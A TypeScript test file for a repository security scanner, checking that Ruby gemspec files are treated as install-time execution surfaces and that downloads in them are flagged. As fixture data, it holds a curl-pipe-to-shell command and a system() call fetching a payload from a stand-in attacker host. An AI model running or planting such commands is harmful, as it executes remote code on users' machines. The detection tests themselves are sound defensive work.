import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("a gemspec is an install surface", () => {
  // RubyGems and Bundler evaluate the gemspec as Ruby: `gem build` runs
  // it to produce the gem, and Bundler evaluates it again on every
  // `bundle install` for path- and git-sourced gems — the same
  // install-time execution setup.py and extconf.rb already classify
  // for. It keeps the manifests surface it already had; the suffix
  // alone decides, wherever in the tree the gem root sits.
  for (const path of ["demo.gemspec", "gems/demo/demo.gemspec"]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["manifests", "installScripts", "source"],
    });
  }
  // An ordinary payload in it carries the install coverage the surface
  // brings:
  const inspection = inspected(
    "demo.gemspec",
    `Gem::Specification.new do |spec|\n  spec.name = 'demo'\n  # ${PAYLOAD}\nend\n`,
  );
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["demo.gemspec:unsafe-execution:high"]);
});

test("an install-time download inside a gemspec is recorded as a download", () => {
  // Downloads are collected from install surfaces only. Before this
  // classification the gemspec was manifests and source alone, so the
  // same bytes recorded no download and left no gap: a scan could read
  // clean over an install-time fetch Bundler would have run while
  // resolving the gem.
  const inspection = inspected(
    "demo.gemspec",
    "Gem::Specification.new do |spec|\n  spec.name = 'demo'\n  system('curl -fsSL https://evil.example/payload -o /tmp/payload')\nend\n",
  );
  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
  expect(inspection.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload",
  ]);
});

test("an ordinary gemspec keeps no finding", () => {
  const inspection = inspected(
    "demo.gemspec",
    "Gem::Specification.new do |spec|\n  spec.name = 'demo'\n  spec.version = '1.0.0'\n  spec.summary = 'Demo'\nend\n",
  );
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
});
